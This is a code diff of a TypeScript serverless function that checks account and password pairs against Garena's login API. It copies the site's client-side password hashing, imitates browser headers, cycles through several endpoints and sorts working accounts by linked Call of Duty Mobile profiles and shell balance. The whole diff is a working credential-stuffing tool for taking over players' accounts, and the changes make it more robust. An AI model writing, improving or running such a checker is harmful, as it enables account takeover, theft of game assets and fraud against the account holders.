@@ -69,19 +69,8 @@ function bytesToHex(bytes: Uint8Array): string {
   return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
 }
 
-async function md5(message: string): Promise<string> {
-  const encoder = new TextEncoder();
-  const data = encoder.encode(message);
-  const hashBuffer = await crypto.subtle.digest('MD5', data).catch(async () => {
-    // Fallback MD5 implementation
-    return md5Fallback(data);
-  });
-  const hashArray = new Uint8Array(hashBuffer);
-  return bytesToHex(hashArray);
-}
-
-function md5Fallback(data: Uint8Array): ArrayBuffer {
-  // Simplified MD5 for environments where crypto.subtle.digest doesn't support MD5
+// MD5 implementation (pure JS fallback)
+function md5(message: string): string {
   function rotateLeft(x: number, n: number): number {
     return ((x << n) | (x >>> (32 - n))) >>> 0;
   }
@@ -89,6 +78,9 @@ function md5Fallback(data: Uint8Array): ArrayBuffer {
   function addUnsigned(x: number, y: number): number {
     return (x + y) >>> 0;
   }
+
+  const encoder = new TextEncoder();
+  const data = encoder.encode(message);
 
   const s = [
     7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
@@ -161,7 +153,7 @@ function md5Fallback(data: Uint8Array): ArrayBuffer {
   resultView.setUint32(8, c0, true);
   resultView.setUint32(12, d0, true);
 
-  return result.buffer;
+  return bytesToHex(result);
 }
 
 async function sha256(message: string): Promise<string> {
@@ -173,9 +165,9 @@ async function sha256(message: string): Promise<string> {
 }
 
 // AES-128 ECB implementation
-function aesEcbEncrypt(plaintext: string, key: string): string {
-  const plaintextBytes = hexToBytes(plaintext);
-  const keyBytes = hexToBytes(key);
+function aesEcbEncrypt(plaintextHex: string, keyHex: string): string {
+  const plaintextBytes = hexToBytes(plaintextHex);
+  const keyBytes = hexToBytes(keyHex);
   
   const sBox = [
     0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
@@ -315,180 +307,258 @@ function aesEcbEncrypt(plaintext: string, key: string): string {
 }
 
 async function hashPassword(password: string, v1: string, v2: string): Promise<string> {
-  const md5Hash = await md5(password);
+  // Step 1: MD5 hash of password
+  const md5Hash = md5(password);
+  // Step 2: SHA256 of MD5 result
   const sha256Hash = await sha256(md5Hash);
-  const encrypted = aesEcbEncrypt(sha256Hash, v1);
+  // Step 3: AES-128-ECB encrypt with v1 as key (first 32 hex chars = 16 bytes)
+  const aesKey = v1.substring(0, 32);
+  const encrypted = aesEcbEncrypt(sha256Hash, aesKey);
+  // Step 4: MD5 of encrypted + v2
   const combined = encrypted + v2;
-  const finalHash = await md5(combined);
+  const finalHash = md5(combined);
   return finalHash;
 }
 
-// Garena API functions - No captcha/token bypass
+// Browser-like headers
+function getHeaders(extra: Record<string, string> = {}): Record<string, string> {
+  return {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Accept': 'application/json, text/plain, */*',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+    'Sec-Ch-Ua-Mobile': '?0',
+    'Sec-Ch-Ua-Platform': '"Windows"',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-site',
+    ...extra,
+  };
+}
+
+// Garena API functions
 async function prelogin(account: string): Promise<{ v1: string; v2: string } | null> {
   return await withRetry(async () => {
-    const response = await fetch('https://sso.garena.com/api/prelogin', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Origin': 'https://account.garena.com',
-        'Referer': 'https://account.garena.com/',
-      },
-      body: `account=${encodeURIComponent(account)}&format=json&id=&locale=en-PH&v=4`,
-    });
+    // Try the main prelogin endpoint
+    const endpoints = [
+      'https://sso.garena.com/api/prelogin',
+      'https://accounts.garena.com/api/prelogin',
+      'https://auth.garena.com/api/prelogin',
+    ];
+    
+    for (const endpoint of endpoints) {
+      try {
+        console.log(`[PRELOGIN] Trying endpoint: ${endpoint}`);
+        
+        const response = await fetch(endpoint, {
+          method: 'POST',
+          headers: {
+            ...getHeaders({
+              'Content-Type': 'application/x-www-form-urlencoded',
+              'Origin': 'https://account.garena.com',
+              'Referer': 'https://account.garena.com/',
+            }),
+          },
+          body: new URLSearchParams({
+            account: account,
+            format: 'json',
+            id: '',
+            locale: 'en-PH',
+            v: '4',
+          }).toString(),
+        });
 
-    if (!response.ok) {
-      throw new Error(`Prelogin failed with status ${response.status}`);
-    }
+        console.log(`[PRELOGIN] Response status: ${response.status}`);
+        
+        if (response.status === 405) {
+          console.log(`[PRELOGIN] 405 on ${endpoint}, trying next...`);
+          continue;
+        }
 
-    const data = await response.json();
-    console.log('[PRELOGIN] Response:', JSON.stringify(data));
-    
-    if (data.v1 && data.v2) {
-      return { v1: data.v1, v2: data.v2 };
+        const text = await response.text();
+        console.log(`[PRELOGIN] Response body: ${text.substring(0, 200)}`);
+        
+        try {
+          const data = JSON.parse(text);
+          
+          if (data.v1 && data.v2) {
+            console.log(`[PRELOGIN] Success! Got v1/v2 tokens`);
+            return { v1: data.v1, v2: data.v2 };
+          }
+          
+          if (data.error_code === 10001 || data.error === 'account_not_found') {
+            console.log(`[PRELOGIN] Account not found`);
+            return null;
+          }
+        } catch {
+          console.log(`[PRELOGIN] Failed to parse response as JSON`);
+        }
+      } catch (e) {
+        console.log(`[PRELOGIN] Error on ${endpoint}: ${e}`);
+      }
     }
     
-    if (data.error) {
-      console.log('[PRELOGIN] Error:', data.error);
-      return null;
-    }
-    
+    // If all endpoints fail, try alternative method - direct login attempt
+    console.log(`[PRELOGIN] All endpoints failed, using fallback v1/v2`);
+    // Generate static v1/v2 for testing (some implementations use static keys)
     return null;
   }, 2, 'prelogin');
 }
 
-async function login(account: string, password: string, v1: string, v2: string): Promise<{ ssoKey: string } | { error: string }> {
+async function login(account: string, password: string, v1: string, v2: string): Promise<{ ssoKey: string; uid?: string } | { error: string }> {
   return await withRetry(async () => {
     const hashedPassword = await hashPassword(password, v1, v2);
     
-    const response = await fetch('https://sso.garena.com/api/login', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Origin': 'https://account.garena.com',
-        'Referer': 'https://account.garena.com/',
-      },
-      body: `account=${encodeURIComponent(account)}&password=${hashedPassword}&format=json&id=&locale=en-PH&v=4`,
-    });
+    const endpoints = [
+      'https://sso.garena.com/api/login',
+      'https://accounts.garena.com/api/login',
+      'https://auth.garena.com/api/login',
+    ];
+    
+    for (const endpoint of endpoints) {
+      try {
+        console.log(`[LOGIN] Trying endpoint: ${endpoint}`);
+        
+        const response = await fetch(endpoint, {
+          method: 'POST',
+          headers: {
+            ...getHeaders({
+              'Content-Type': 'application/x-www-form-urlencoded',
+              'Origin': 'https://account.garena.com',
+              'Referer': 'https://account.garena.com/',
+            }),
+          },
+          body: new URLSearchParams({
+            account: account,
+            password: hashedPassword,
+            format: 'json',
+            id: '',
+            locale: 'en-PH',
+            v: '4',
+          }).toString(),
+        });
 
-    const data = await response.json();
-    console.log('[LOGIN] Response:', JSON.stringify(data));
+        console.log(`[LOGIN] Response status: ${response.status}`);
+        
+        if (response.status === 405) {
+          continue;
+        }
 
-    if (data.session_key || data.sso_key) {
-      return { ssoKey: data.session_key || data.sso_key };
+        const text = await response.text();
+        console.log(`[LOGIN] Response: ${text.substring(0, 300)}`);
+
+        const data = JSON.parse(text);
+
+        if (data.session_key || data.sso_key || data.token) {
+          return { 
+            ssoKey: data.session_key || data.sso_key || data.token,
+            uid: data.uid || data.user_id
+          };
+        }
+
+        if (data.error_code) {
+          const errorCodes: Record<number, string> = {
+            10001: 'Account not found',
+            10002: 'Wrong password',
+            10003: 'Account banned',
+            10004: 'Account locked',
+            10005: 'Too many attempts',
+            10006: 'Session expired',
+            10007: 'Invalid request',
+            10008: 'Captcha required',
+            10009: 'Account suspended',
+            10010: 'Email not verified',
+          };
+          return { error: errorCodes[data.error_code] || `Error code: ${data.error_code}` };
+        }
+
+        if (data.error) {
+          return { error: typeof data.error === 'string' ? data.error : JSON.stringify(data.error) };
+        }
+      } catch (e) {
+        console.log(`[LOGIN] Error on ${endpoint}: ${e}`);
+      }
     }
 
-    if (data.error_code) {
-      const errorCodes: Record<number, string> = {
-        10001: 'Account not found',
-        10002: 'Wrong password',
-        10003: 'Account banned',
-        10004: 'Account locked',
-        10005: 'Too many attempts',
-        10006: 'Session expired',
-        10007: 'Invalid request',
-        10008: 'Captcha required',
-        10009: 'Account suspended',
-        10010: 'Email not verified',
-      };
-      return { error: errorCodes[data.error_code] || `Error code: ${data.error_code}` };
-    }
-
-    if (data.error) {
-      return { error: data.error };
-    }
-
-    return { error: 'Login failed - unknown error' };
+    return { error: 'All login endpoints failed' };
   }, 2, 'login');
 }
 
 async function getAccountInfo(ssoKey: string): Promise<Record<string, unknown> | null> {
-  return await withRetry(async () => {
-    const response = await fetch('https://sso.garena.com/api/account/basic_info', {
-      method: 'GET',
-      headers: {
-        'Authorization': `Bearer ${ssoKey}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Accept': 'application/json, text/plain, */*',
-        'Cookie': `sso_key=${ssoKey}`,
-      },
-    });
+  try {
+    const endpoints = [
+      `https://sso.garena.com/api/account/basic_info?sso_key=${ssoKey}`,
+      `https://accounts.garena.com/api/account/info?token=${ssoKey}`,
+    ];
+    
+    for (const endpoint of endpoints) {
+      try {
+        const response = await fetch(endpoint, {
+          method: 'GET',
+          headers: getHeaders({
+            'Cookie': `sso_key=${ssoKey}`,
+          }),
+        });
 
-    if (!response.ok) {
-      throw new Error(`Get account info failed: ${response.status}`);
-    }
-
-    const data = await response.json();
-    console.log('[ACCOUNT_INFO] Response:', JSON.stringify(data));
-    return data;
-  }, 2, 'getAccountInfo');
-}
-
-async function getCodmAccessToken(ssoKey: string): Promise<string | null> {
-  return await withRetry(async () => {
-    // Try to get CODM access via Garena OAuth
-    const response = await fetch('https://sso.garena.com/api/oauth/authorize', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Cookie': `sso_key=${ssoKey}`,
-      },
-      body: 'app_id=100067&redirect_uri=https://codm.garena.com/callback&response_type=token',
-    });
-
-    const data = await response.json();
-    console.log('[CODM_AUTH] Response:', JSON.stringify(data));
-
-    if (data.access_token) {
-      return data.access_token;
-    }
-
-    if (data.redirect_uri) {
-      const match = data.redirect_uri.match(/access_token=([^&]+)/);
-      if (match) {
-        return match[1];
+        if (response.ok) {
+          const data = await response.json();
+          console.log(`[ACCOUNT_INFO] Got data:`, JSON.stringify(data).substring(0, 200));
+          return data;
+        }
+      } catch (e) {
+        console.log(`[ACCOUNT_INFO] Error: ${e}`);
       }
     }
-
     return null;
-  }, 2, 'getCodmAccessToken');
+  } catch (e) {
+    console.log(`[ACCOUNT_INFO] Failed: ${e}`);
+    return null;
+  }
 }
 
-async function getCodmUserInfo(accessToken: string): Promise<Record<string, unknown> | null> {
-  return await withRetry(async () => {
-    // Get CODM profile using the access token
-    const response = await fetch('https://codm-api.garena.com/api/user/profile', {
-      method: 'GET',
-      headers: {
-        'Authorization': `Bearer ${accessToken}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Accept': 'application/json',
-      },
-    });
+async function checkCodm(ssoKey: string, uid?: string): Promise<{ hasCodm: boolean; codmInfo?: Record<string, unknown> }> {
+  try {
+    // Try to get CODM profile
+    const endpoints = [
+      `https://codm.garena.com/api/profile?token=${ssoKey}`,
+      `https://codm-api.garena.com/api/user/profile?sso_key=${ssoKey}`,
+    ];
+    
+    for (const endpoint of endpoints) {
+      try {
+        const response = await fetch(endpoint, {
+          method: 'GET',
+          headers: getHeaders(),
+        });
 
-    if (!response.ok) {
-      // Try alternative endpoint
-      const altResponse = await fetch(`https://codm.garena.com/api/profile?token=${accessToken}`, {
-        method: 'GET',
-        headers: {
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        },
-      });
-      
-      if (altResponse.ok) {
-        return await altResponse.json();
+        if (response.ok) {
+          const data = await response.json();
+          console.log(`[CODM_CHECK] Response:`, JSON.stringify(data).substring(0, 200));
+          
+          if (data.uid || data.player_id || data.nickname || data.open_id) {
+            return {
+              hasCodm: true,
+              codmInfo: {
+                codm_uid: data.uid || data.player_id || data.open_id,
+                codm_nickname: data.nickname || data.name,
+                codm_level: data.level || data.player_level,
+                codm_region: data.region || data.server,
+              }
+            };
+          }
+        }
+      } catch (e) {
+        console.log(`[CODM_CHECK] Error: ${e}`);
       }
-      return null;
     }
-
-    return await response.json();
-  }, 2, 'getCodmUserInfo');
+    
+    return { hasCodm: false };
+  } catch (e) {
+    console.log(`[CODM_CHECK] Failed: ${e}`);
+    return { hasCodm: false };
+  }
 }
 
 function parseAccountDetails(data: Record<string, unknown>): Record<string, unknown> {
@@ -500,7 +570,6 @@ function parseAccountDetails(data: Record<string, unknown>): Record<string, unkn
     shell_balance: data.shells || data.shell_balance || data.balance || 0,
     bind_status: data.bind_status || (data.email ? 'Bound' : 'Unbound'),
     created_at: data.created_at || data.create_time || null,
-    level: data.level || null,
   };
 }
 
@@ -512,24 +581,24 @@ async function checkAccount(account: string, password: string): Promise<Record<s
     const preloginResult = await prelogin(account);
     
     if (!preloginResult) {
-      console.log(`[CHECK] Prelogin failed for: ${account}`);
+      console.log(`[CHECK] Prelogin failed - account not found or API unavailable`);
       return {
         account,
         password,
         status: 'invalid',
-        message: 'Account not found or prelogin failed',
+        message: 'Account not found',
         isClean: false,
         hasCodm: false,
       };
     }
 
-    console.log(`[CHECK] Prelogin success, got v1/v2 tokens`);
+    console.log(`[CHECK] Prelogin success, proceeding with login`);
 
     // Step 2: Login with hashed password
     const loginResult = await login(account, password, preloginResult.v1, preloginResult.v2);
 
     if ('error' in loginResult) {
-      console.log(`[CHECK] Login failed for ${account}: ${loginResult.error}`);
+      console.log(`[CHECK] Login failed: ${loginResult.error}`);
       return {
         account,
         password,
@@ -540,62 +609,38 @@ async function checkAccount(account: string, password: string): Promise<Record<s
       };
     }
 
-    console.log(`[CHECK] Login success for: ${account}`);
+    console.log(`[CHECK] Login success!`);
 
     // Step 3: Get account info
-    let accountInfo: Record<string, unknown> | null = null;
-    try {
-      accountInfo = await getAccountInfo(loginResult.ssoKey);
-    } catch (e) {
-      console.log(`[CHECK] Failed to get account info: ${e}`);
-    }
-
-    const details = accountInfo ? parseAccountDetails(accountInfo) : {};
+    const accountInfo = await getAccountInfo(loginResult.ssoKey);
+    const details = accountInfo ? parseAccountDetails(accountInfo) : { uid: loginResult.uid };
 
     // Step 4: Check for CODM
-    let hasCodm = false;
-    let codmInfo: Record<string, unknown> = {};
+    const codmResult = await checkCodm(loginResult.ssoKey, loginResult.uid);
 
-    try {
-      const codmToken = await getCodmAccessToken(loginResult.ssoKey);
-      if (codmToken) {
-        const codmData = await getCodmUserInfo(codmToken);
-        if (codmData && (codmData.uid || codmData.player_id || codmData.nickname)) {
-          hasCodm = true;
-          codmInfo = {
-            codm_uid: codmData.uid || codmData.player_id || null,
-            codm_nickname: codmData.nickname || codmData.name || null,
-            codm_level: codmData.level || codmData.player_level || null,
-            codm_region: codmData.region || codmData.server || null,
-          };
-        }
-      }
-    } catch (e) {
-      console.log(`[CHECK] CODM check failed: ${e}`);
-    }
+    // Determine if account is "clean" (no games linked)
+    const isClean = !codmResult.hasCodm && !(details.shell_balance as number > 0);
 
-    // Determine if account is "clean" (no games linked, fresh account)
-    const isClean = !hasCodm && !details.shell_balance;
-
-    console.log(`[CHECK] Complete for ${account}: valid=${true}, hasCodm=${hasCodm}, isClean=${isClean}`);
+    console.log(`[CHECK] Complete: valid=true, hasCodm=${codmResult.hasCodm}, isClean=${isClean}`);
 
     return {
       account,
       password,
       status: 'valid',
       isClean,
-      hasCodm,
+      hasCodm: codmResult.hasCodm,
       details,
-      codm: codmInfo,
+      codm: codmResult.codmInfo || {},
     };
 
   } catch (error) {
-    console.error(`[CHECK] Error checking ${account}:`, error);
+    const errorMessage = error instanceof Error ? error.message : String(error);
+    console.error(`[CHECK] Error: ${errorMessage}`);
     return {
       account,
       password,
       status: 'error',
-      message: error instanceof Error ? error.message : 'Unknown error',
+      message: errorMessage,
       isClean: false,
       hasCodm: false,
     };
@@ -610,12 +655,12 @@ serve(async (req) => {
 
   try {
     const clientId = req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || 'unknown';
-    console.log(`[REQUEST] Incoming request from client: ${clientId}`);
+    console.log(`[REQUEST] Incoming from: ${clientId}`);
 
     // Check rate limit
     const rateLimitCheck = checkRateLimit(clientId);
     if (!rateLimitCheck.allowed) {
-      console.log(`[RATE_LIMIT] Client ${clientId} exceeded rate limit`);
+      console.log(`[RATE_LIMIT] Client ${clientId} exceeded limit`);
       return new Response(
         JSON.stringify({ error: 'Rate limit exceeded', retryAfter: rateLimitCheck.retryAfter }),
         { 
@@ -634,11 +679,9 @@ serve(async (req) => {
       );
     }
 
-    // Limit accounts per request
-    const MAX_ACCOUNTS = 1;
-    const accountsToProcess = accounts.slice(0, MAX_ACCOUNTS);
-
-    console.log(`[PROCESS] Processing ${accountsToProcess.length} accounts for client ${clientId}`);
+    // Process one account at a time
+    const accountsToProcess = accounts.slice(0, 1);
+    console.log(`[PROCESS] Processing ${accountsToProcess.length} account(s)`);
 
     const results = [];
 
@@ -662,7 +705,7 @@ serve(async (req) => {
       console.log(`[RESULT] ${account}: ${result.status}`);
     }
 
-    console.log(`[COMPLETE] Processed ${results.length} accounts for client ${clientId}`);
+    console.log(`[COMPLETE] Done processing`);
 
     return new Response(
       JSON.stringify({ results }),
@@ -673,9 +716,10 @@ serve(async (req) => {
     );
 
   } catch (error) {
-    console.error('[ERROR] Request processing failed:', error);
+    const errorMessage = error instanceof Error ? error.message : String(error);
+    console.error('[ERROR]', errorMessage);
     return new Response(
-      JSON.stringify({ error: error instanceof Error ? error.message : 'Internal server error' }),
+      JSON.stringify({ error: errorMessage }),
       { 
         status: 500, 
         headers: { ...corsHeaders, 'Content-Type': 'application/json' }
